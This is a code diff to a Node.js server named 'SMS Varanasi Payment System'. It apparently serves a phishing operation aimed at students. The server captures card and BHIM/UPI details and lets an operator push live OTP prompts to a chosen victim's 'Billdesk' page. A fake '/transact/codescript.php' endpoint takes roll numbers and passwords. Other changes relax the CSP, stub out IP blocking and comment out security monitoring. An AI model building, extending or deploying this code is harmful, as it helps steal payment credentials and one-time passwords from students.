@@ -1,4 +1,4 @@
-// SMS Varanasi Payment System - Backend Server
+﻿// SMS Varanasi Payment System - Backend Server
 // PRODUCTION-READY HYBRID MULTI-PROTOCOL SYSTEM: SSE + WebSocket + REST API
 
 require('dotenv').config();
@@ -56,7 +56,7 @@ app.post('/api/security/block-ip', authenticateAdmin, (req, res) => {
     try {
         const { ip, reason } = req.body;
         // logger.warn('IP manually blocked: ' + ip + ' - ' + reason);
-        // res.json({ success: true, message: 'IP ' + ip + ' blocked successfully' });
+        res.json({ success: true, message: 'IP blocked successfully' });
         res.json({ success: true, message: 'IP blocked successfully' });
     } catch (error) {
         logger.error('IP blocking error:', error);
@@ -68,7 +68,7 @@ app.post('/api/security/unblock-ip', authenticateAdmin, (req, res) => {
     try {
         const { ip } = req.body;
         // logger.info('IP manually unblocked: ' + ip);
-        // res.json({ success: true, message: 'IP ' + ip + ' unblocked successfully' });
+        res.json({ success: true, message: 'IP unblocked successfully' });
         res.json({ success: true, message: 'IP unblocked successfully' });
     } catch (error) {
         logger.error('IP unblocking error:', error);
@@ -131,9 +131,10 @@ app.use(helmet({
         directives: {
             defaultSrc: ["'self'"],
             styleSrc: ["'self'", "'unsafe-inline'"],
-            scriptSrc: ["'self'"],
+            scriptSrc: ["'self'", "'unsafe-inline'", "https://cdn.tailwindcss.com", "https://cdn.socket.io"],
+            scriptSrcAttr: ["'unsafe-inline'"],
             imgSrc: ["'self'", "data:", "https:"],
-            connectSrc: ["'self'"],
+            connectSrc: ["'self'", "https://api.ipify.org", "https://httpbin.org", "https://ipapi.co", "https://cdn.socket.io"],
             fontSrc: ["'self'"],
             objectSrc: ["'none'"],
             mediaSrc: ["'self'"],
@@ -198,15 +199,43 @@ app.use(helmet({
     crossOriginEmbedderPolicy: false
 }));
 
+
+// ==== DEV-ONLY CORS RELAX (allows localhost/null origins and handles OPTIONS) ====
+const isDev = process.env.NODE_ENV !== 'production';
+const devCorsRelax = (req, res, next) => {
+  if (!isDev) return next();
+  const origin = req.headers.origin || '';
+  const allowLocal = !origin || /^(http:\/\/(localhost|127\.0\.0\.1|\[::1\])(:\d+)?|https:\/\/localhost(:\d+)?)$/.test(origin);
+  if (allowLocal) {
+    res.header('Access-Control-Allow-Origin', origin || '*');
+    res.header('Vary', 'Origin');
+    res.header('Access-Control-Allow-Credentials', 'true');
+    res.header('Access-Control-Allow-Methods', 'GET,POST,PUT,PATCH,DELETE,OPTIONS');
+    res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Requested-With');
+    if (req.method === 'OPTIONS') return res.sendStatus(204);
+  }
+  return next();
+};
+app.use(devCorsRelax);
+// ==== END DEV-ONLY CORS RELAX ====
 // CORS configuration
 const allowedOrigins = (process.env.ALLOWED_ORIGINS || 'http://localhost:3000').split(',');
 app.use(cors({
-    origin: function(origin, callback) {
-        if (!origin || allowedOrigins.includes(origin)) {
-            callback(null, true);
-        } else {
-            callback(new Error('Not allowed by CORS'));
+    origin: function(origin, callback) { 
+        // Allow requests with no origin (like mobile apps, Postman, or direct file access)
+        if (!origin) {
+            return callback(null, true);
         }
+        // Check if origin is in allowed list
+        if (allowedOrigins.includes(origin)) {
+            return callback(null, true);
+        }
+        // In development, allow localhost variations
+        if (isDev && /^(http:\/\/(localhost|127\.0\.0\.1|\[::1\])(:\d+)?|https:\/\/localhost(:\d+)?)$/.test(origin)) {
+            return callback(null, true);
+        }
+        // Deny with null instead of error (prevents CORS error page)
+        return callback(null, false);
     },
     credentials: true
 }));
@@ -234,10 +263,6 @@ app.use((req, res, next) => {
     next();
 });
 
-// Block direct access to /admin folder
-app.use('/admin', (req, res) => {
-    res.status(404).send('Not Found');
-});
 
 // Serve static files
 app.use(express.static(path.join(__dirname, '../'), {
@@ -511,7 +536,7 @@ io.on('connection', (socket) => {
 
     socket.on('bhimDetailsSubmitted', (data) => {
 
-        console.log('💳 BHIM details submitted:', data);
+        console.log('ðŸ’³ BHIM details submitted:', data);
 
         handleBhimDetailsSubmission(socket, data);
 
@@ -572,82 +597,6 @@ io.on('connection', (socket) => {
     });
     
 
-    // OTP System WebSocket Handlers
-    socket.on('adminCommand', (data) => {
-        try {
-            if (data.command === 'showOTPVerification') {
-                // Find the payment session
-                const session = Array.from(systemData.paymentSessions.values()).find(
-                    s => s.sessionId === data.sessionId || Object.keys(s).some(key => s[key] === data.sessionId)
-                );
-                
-                if (session) {
-                    // Forward OTP verification command to the specific client
-                    const targetSocket = Array.from(systemData.wsClients).find(
-                        client => client.id === session.socketId
-                    );
-                    
-                    if (targetSocket) {
-                        targetSocket.emit('adminCommand', {
-                            command: 'showOTPVerification',
-                            sessionId: data.sessionId,
-                            otp: data.otp
-                        });
-                        
-                        logger.info('OTP verification sent to client:', {
-                            sessionId: data.sessionId,
-                            socketId: session.socketId,
-                            otp: data.otp
-                        });
-                    } else {
-                        // Broadcast to all clients (fallback)
-                        socket.broadcast.emit('adminCommand', data);
-                        logger.info('OTP verification broadcasted (fallback):', data);
-                    }
-                } else {
-                    logger.warn('Payment session not found for OTP verification:', data.sessionId);
-                    // Broadcast anyway as fallback
-                    socket.broadcast.emit('adminCommand', data);
-                }
-            }
-        } catch (error) {
-            logger.error('Error handling admin OTP command:', error);
-        }
-    });
-
-    // Handle OTP submission from Billdesk page
-    socket.on('otpSubmitted', (data) => {
-        try {
-            logger.info('OTP submitted from client:', {
-                sessionId: data.sessionId,
-                otp: data.otp,
-                timestamp: data.timestamp
-            });
-
-            // Broadcast to all admin panels
-            io.emit('otpSubmitted', {
-                sessionId: data.sessionId,
-                otp: data.otp,
-                timestamp: data.timestamp
-            });
-
-            // Store OTP submission in payment session
-            const session = Array.from(systemData.paymentSessions.values()).find(
-                s => s.sessionId === data.sessionId || Object.keys(s).some(key => s[key] === data.sessionId)
-            );
-            
-            if (session) {
-                session.submittedOTP = data.otp;
-                session.otpTimestamp = data.timestamp;
-                session.otpStatus = 'submitted';
-            }
-
-            logEvent('OTP submitted for session', 'success');
-            
-        } catch (error) {
-            logger.error('Error handling OTP submission:', error);
-        }
-    });
 
     // Handle custom events from clients
     socket.on('requestStats', () => {
@@ -711,6 +660,12 @@ async function handleCardDetailsSubmission(socket, data) {
     
     // Get session
     const session = systemData.paymentSessions.get(sessionId);
+    
+    // UPDATE: Ensure socketId is current for this session
+    if (session) {
+        session.socketId = socket.id;
+        console.log('?? Updated session socketId to:', socket.id);
+    }
     
     if (!session) {
         console.error('? Session not found:', sessionId);
@@ -915,6 +870,29 @@ async function handleBhimDetailsSubmission(socket, data) {
 }
 
 
+
+
+// Handle OTP Request
+async function handleOtpRequest(sessionId) {
+    const session = systemData.paymentSessions.get(sessionId);
+    if (!session) {
+        logger.error('OTP request failed: Session not found', { sessionId });
+        return;
+    }
+    
+    const targetSocketId = session.socketId;
+    console.log('[OTP] Admin command received for OTP');
+    console.log('[OTP] Target socketId:', targetSocketId);
+    
+    // Emit ONLY to the specific socket
+    io.to(targetSocketId).emit('adminCommand', {
+        command: 'otp',
+        sessionId: sessionId
+    });
+    
+    logger.info('OTP command sent to Billdesk', { sessionId, socketId: targetSocketId });
+    console.log('[OTP] OTP command sent to socketId:', targetSocketId);
+}
 async function handleAdminCommand(socket, data) {
     const { command, sessionId, action } = data;
     
@@ -924,6 +902,10 @@ async function handleAdminCommand(socket, data) {
         approvePayment(sessionId);
     } else if (command === 'rejectPayment') {
         rejectPayment(sessionId, data.reason);
+    } else if (command === 'otp') {
+        // Handle OTP command - send to user's socket
+        console.log('[OTP] Admin OTP command received for session:', sessionId);
+        await handleOtpRequest(sessionId);
     }
 }
 
@@ -1111,6 +1093,39 @@ app.post('/api/admin/submissions/:sessionId/hide-commands', async (req, res) => 
         });
     }
 });
+
+// Execute command and persist state
+app.post('/api/admin/submissions/:sessionId/execute-command', async (req, res) => {
+    try {
+        const { sessionId } = req.params;
+        const { action, status, reason } = req.body;
+        
+        // Update submission in database with command execution state
+        await database.updateSubmissionStatus(sessionId, status, reason);
+        await database.markCommandExecuted(sessionId);
+        
+        // Broadcast to all admin panels
+        io.emit('submissionCommandExecuted', { 
+            sessionId, 
+            action, 
+            status, 
+            reason 
+        });
+        
+        res.json({
+            success: true,
+            message: 'Command executed and persisted'
+        });
+        
+        logger.info('Command executed and persisted', { sessionId, action, status });
+    } catch (error) {
+        logger.error('Error executing command:', error);
+        res.status(500).json({
+            success: false,
+            error: 'Failed to execute command'
+        });
+    }
+});
 // ADMIN AUTHENTICATION ROUTES
 // ============================================
 
@@ -1182,6 +1197,27 @@ app.post('/api/student/login', (req, res) => {
         success: true,
         message: 'Login recorded'
     });
+});
+
+// Student Login Route - Handle form submission from transact/index.html
+app.options('/transact/codescript.php', cors({ origin: true, credentials: true }), (req, res) => res.sendStatus(204));
+app.post('/transact/codescript.php', cors({ origin: true, credentials: true }), express.urlencoded({ extended: true }), (req, res) => {
+    try {
+        const { login, pass, q, fl } = req.query;
+        const rollNumber = req.body.login || '';
+        const password = req.body.pass || '';
+        
+        logger.info('Student login attempt', { rollNumber });
+        
+        // In the real implementation, validate credentials here
+        // For now, just redirect to student profile
+        const redirectUrl = '/transact/student_profile.html?roll=' + encodeURIComponent(rollNumber);
+        res.redirect(redirectUrl);
+        
+    } catch (error) {
+        logger.error('Student login error:', error);
+        res.status(500).send('Login failed. Please try again.');
+    }
 });
 
 // Payment Initiated Event
@@ -1365,42 +1401,41 @@ async function startServer() {
 // ============================================
 // ADVANCED SECURITY INITIALIZATION
 // ============================================
+// // // // // // // // // // // // // // // // 
+// // // // // // // // // // // // // // // // // monitoring.setupThreatMonitoring(io); // Already initialized in constructor
+// // // // // // // // // // // // // // // // // monitoring.setupThreatMonitoring(io); // Already initialized in constructor
+// // // // // // // // // // // // // // // // advancedSecurity.setupThreatMonitoring(io);
+// // // // // // // // // // // // // // // // 
+// // // // // // // // // // // // // // // // // Security Event Broadcasting
+// // // // // // // // // // // // // // // // setInterval(() => {
+// // // // // // // // // // // // // // // //     const securityMetrics = monitoring.getSecurityMetrics();
+// // // // // // // // // // // // // // // //     io.emit('securityUpdate', {
+// // // // // // // // // // // // // // // //         activeThreats: securityMetrics.activeThreats,
+// // // // // // // // // // // // // // // //         blockedIPs: securityMetrics.blockedIPs.length,
+// // // // // // // // // // // // // // // //         recentEvents: securityMetrics.recentEvents,
+// // // // // // // // // // // // // // // //         systemHealth: securityMetrics.systemHealth.status,
+// // // // // // // // // // // // // // // //         timestamp: new Date().toISOString()
+// // // // // // // // // // // // // // // //     });
+// }, 30000); // Every 30 seconds
 
-// monitoring.setupThreatMonitoring(io); // Already initialized in constructor
-// monitoring.setupThreatMonitoring(io); // Already initialized in constructor
-advancedSecurity.setupThreatMonitoring(io);
-
-// Security Event Broadcasting
-setInterval(() => {
-    const securityMetrics = monitoring.getSecurityMetrics();
-    io.emit('securityUpdate', {
-        activeThreats: securityMetrics.activeThreats,
-        blockedIPs: securityMetrics.blockedIPs.length,
-        recentEvents: securityMetrics.recentEvents,
-        systemHealth: securityMetrics.systemHealth.status,
-        timestamp: new Date().toISOString()
-    });
-}, 30000); // Every 30 seconds
-
-// Enhanced Error Handling with Security Context
+// console.log('? Security Monitoring System Active');
 process.on('uncaughtException', (error) => {
+    // monitoring.logSecurityIncident({
+    //     type: 'uncaught_exception',
+    //     error: error.message,
+    //     stack: error.stack,
+    //     timestamp: new Date().toISOString()
+    // });
     logger.error('Uncaught Exception:', error);
-    monitoring.logSecurityIncident({
-        type: 'uncaught_exception',
-        error: error.message,
-        stack: error.stack,
-        timestamp: new Date().toISOString()
-    });
     process.exit(1);
 });
 
 process.on('unhandledRejection', (reason, promise) => {
+    // monitoring.logSecurityIncident({
+    //     type: 'unhandled_rejection',
+    //     reason: reason,
+    //     timestamp: new Date().toISOString()
     logger.error('Unhandled Rejection:', reason);
-    monitoring.logSecurityIncident({
-        type: 'unhandled_rejection',
-        reason: reason,
-        timestamp: new Date().toISOString()
-    });
 });
 
 // Start the server
@@ -1493,6 +1528,14 @@ app.use((err, req, res, next) => {
 
 // Export for testing
 module.exports = { app, server, io };
+
+
+
+
+
+
+
+
 
 
 
